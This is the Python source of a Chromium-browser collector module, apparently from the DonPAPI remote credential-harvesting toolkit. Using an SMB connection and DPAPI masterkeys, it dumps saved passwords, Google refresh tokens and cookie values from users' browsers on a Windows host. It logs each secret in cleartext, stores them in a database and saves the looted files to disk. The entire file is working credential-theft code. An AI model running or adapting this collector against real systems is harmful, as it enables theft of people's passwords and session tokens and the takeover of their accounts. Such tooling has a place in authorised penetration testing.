from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken, Cookie
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


class Chromium:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        self.logger.display("Dumping User Chromium Browsers")

        def browser_callback(credential):
            if isinstance(credential, LoginData):
                cred_url = credential.url + " -" if credential.url != "" else "-"
                self.logger.secret(f"[{credential.winuser}] [Password] {cred_url} {credential.username}:{credential.password}", f"{credential.browser.upper()}")
                self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=credential.winuser, username=credential.username, password=credential.password, target=credential.url, program=credential.browser.title())
            elif isinstance(credential, GoogleRefreshToken):
                self.logger.secret(f"[{credential.winuser}] [Google Refresh Token] {credential.service}:{credential.token}", f"{credential.browser.upper()}")
                self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=credential.winuser, username=credential.service, password=credential.token, target="Google Refresh Token", program=credential.browser.title())
            elif isinstance(credential, Cookie):
                if credential.cookie_value != "":
                    self.logger.secret(f"[{credential.winuser}] [Cookie] {credential.host}{credential.path} - {credential.cookie_name}:{credential.cookie_value}",f"{credential.browser.upper()}")
                    self.context.db.add_cookie(
                        computer=self.context.host,
                        browser=credential.browser,
                        windows_user=credential.winuser,
                        url=f"{credential.host}{credential.path}",
                        cookie_name=credential.cookie_name,
                        cookie_value=credential.cookie_value,
                        creation_utc=credential.creation_utc,
                        expires_utc=credential.expires_utc, 
                        last_access_utc=credential.last_access_utc,
                    )

        browser_triage = BrowserTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, per_secret_callback=browser_callback)
        browser_triage.triage_browsers(gather_cookies=True)
        dump_looted_files_to_disk(self.context.target_output_dir, browser_triage.looted_files)